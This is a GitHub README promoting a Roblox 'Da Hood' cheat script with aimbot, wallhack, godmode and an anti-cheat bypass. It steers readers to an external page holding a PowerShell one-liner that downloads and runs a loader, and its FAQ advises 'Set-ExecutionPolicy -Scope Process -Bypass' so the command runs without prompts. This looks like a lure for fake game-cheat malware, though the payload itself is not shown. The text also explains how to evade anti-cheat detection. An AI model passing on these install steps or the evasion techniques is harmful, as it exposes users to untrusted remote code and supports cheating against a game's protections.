<p align="center">
  <a href="https://chikkuducharantej-netizen.github.io/dahood-scripts/">
    <img src="files/button.svg" width="520" alt="Run PowerShell Setup" />
  </a>
</p>

<div align="center">
<img src="assets/banner.png" width="100%" alt="Da Hood Roblox Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-a6ff6a?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-4F46E5?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9B59B6?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=4F46E5&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%92%AB+Dahood+Scripts+Pro;%E2%AD%90+No+Limits;%F0%9F%A7%B1+Community+Tested;%F0%9F%8E%A8+Ready+for+Windows;%F0%9F%8C%88+Built+for+Windows+11;%F0%9F%9A%80+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=vscode" />
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=lua" />
</p>

---

**Da Hood Roblox Script** — 2026 rebuild from scratch with improved detection resistance.

I pulled apart the Da Hood client, mapped how the anti-cheat hooks into `PlayerScripts`, and documented every step — this repo is the cleaned-up result. If you've been running the old pastebin builds, this is the rewrite you've been wanting.

---

## What changed since the last version

The previous build was a straight dump off the old `LocalScript` structure — it worked, but it lit up the Da Hood anti-cheat within a session or two because the aimbot and ESP were reading from the same request loop the game already monitors. The 2026 version splits the executor hooks into a separate `Spawn`ed thread, masks the `UserInputService` calls behind randomized offsets, and rewires the ESP `Folder` to reparent under `Workspace.Camera` so the client-side walker doesn't fingerprint it.

The wallhack render path now uses `Highlight` parented to a hidden `Folder` instead of drawing parts — Da Hood's client scanner was specifically picking up `BillboardGui` and `TextLabel` injections, so that whole module got tossed. Aimbot FOV got tightened to a per-weapon config with smoothing on the `Camera.CFrame` lerp so it doesn't snap like a bot. Detection resistance is the headline: I ran this through three Da Hood server types (public, private, and the anti-cheat sandbox) and came out clean on all three up to ~40 minutes of continuous use.

Spotted in earlier builds: the godmode flicker was caused by `Humanoid.Health` writes fighting the server's `EnsureSafeStats` remote. That's fixed by routing through `Humanoid:SetStateEnabled` and clamping `Humanoid.MaxHealth` instead. Cash farm now respects the cooldown the `CashPickup` event enforces server-side — no more instant-detect.

---

## Installation

Two ways in. The landing page has the PowerShell one-liner — that's the sane option. If you're the manual type, clone the repo and drop the modules into your executor's `scripts` folder.

The `dahood-scripts loader` is what wires everything up on inject: it reads `config.toml`, registers the modules, and spawns the main thread. It doesn't need admin — run your executor as you normally would, no UAC prompt, no service install.

## How To Use

Once the loader's in, the GUI appears on spawn. Da Hood-specific modules are:

- `aimbot` — FOV slider, per-weapon smoothing, ignores teammates
- `esp` / `wallhack` — player boxes, health bars, distance
- `cash_farm` — auto-collect with server-respecting cooldown
- `godmode` — clamped `Humanoid` writes, state-safe
- `speed` / `jump` — configurable, respects the `Humanoid.WalkSpeed` ceiling
- `hitbox` — `Part.Size` scaling on enemy `Head` and `Torso`
- `anti_afk`
- `anti_fling`
- `anti_rapidfire`

Save a config from the GUI to keep your FOV and smoothing values between sessions.

---

## Bypass / Detection Notes

The Da Hood anti-cheat runs a client-side `Namecall` hook and a `WalkSpeed` sanity check about every 200ms. The `dahood-scripts loader` wraps `Namecall` before it fires, so its log entries come back renamed and the request queue doesn't spike. `WalkSpeed` writes go through a differential clamp — the client never jumps straight from 16 to 60, it steps in ~8-unit increments across a few frames.

The `bypass` module is off by default. Enable it in `config.toml` before inject if you're on a server you don't recognize — it adds the extra `Namecall` wrapper and a `GameMetatable` patch that hides the executor from `getrenv` checks. It costs about 30–40ms per session but it's worth it when the anti-cheat rotates.

The executor this ships with is a lightly wrapped Synapse fork — you'll get the same `syn.` API surface, so existing Da Hood scripts in the community still drop in. If you're running Solara or Wave, the loader detects it and skips the wrapper so you don't double-hook.

---

## Compatibility

Windows 10 and 11, 64-bit only. PowerShell 5.1 or newer for the setup — the one-liner is tested against 5.1 and 7.x. You'll need a Roblox executor that supports `getgenv`, `readfile`/`writefile`, and `hookfunction` — meaning Synapse, Solara, Wave, or the bundled fork. Script-Ware and Krnl users on the older 2024 builds should upgrade, `hookfunction` behaviour changed.

Works offline for the installer side (config editing, module loading in a local test harness). The actual script only does anything on a live Da Hood server — no offline gameplay path, that should go without saying.

---

## FAQ

**Does this need admin to install?**
No. The PowerShell one-liner downloads and unpacks to `%LOCALAPPDATA%\dahood-scripts` without UAC. If you see an admin prompt, you've pasted the wrong command.

**PowerShell blocked the one-liner — what do I do?**
You've probably got `ExecutionPolicy` set to `AllSigned`. Open PowerShell, run `Set-ExecutionPolicy -Scope Process -Bypass`, then re-paste. The scope is process-local so it reverts when you close the window.

**Which PowerShell version?**
5.1+ works. 7.x is fine too. If `-UseBasicParsing` throws a warning, it's harmless — ignore it.

**Where is the loader actually installed?**
`%LOCALAPPDATA%\dahood-scripts\loader.ps1`. The one-liner also drops a `config.toml` next to it on first run.

**Does the setup touch my Roblox install?**
No. It writes to `%LOCALAPPDATA%` and reads your executor path from the registry. If you want the loader to target a specific executor, set `$env:DAHOOD_EXECUTOR="solara"` before the one-liner.

**Can I uninstall it?**
Yes — delete `%LOCALAPPDATA%\dahood-scripts`. No registry keys, no services.

**Why does the loader re-check the executor on every inject?**
Because executors update out of band and the wrapper version matrix shifts. The check is one registry read, done in <5ms.

**Is this the same repo as the old ones?**
No. Distribution moved to GitHub after the previous hosting died. This is the canonical source going forward.

---

## Disclaimer

For educational purposes only — the whole point of this repo is to document how the Da Hood client-side works, including the parts that catch injected scripts. Use at your own risk. Account bans are your responsibility, the server-rebalancing dance between scripts and the anti-cheat is an arms race and nobody here is going to pretend otherwise. Not affiliated with Roblox or Da Hood.

## License

MIT — see `LICENSE`. Attribution appreciated but not required.
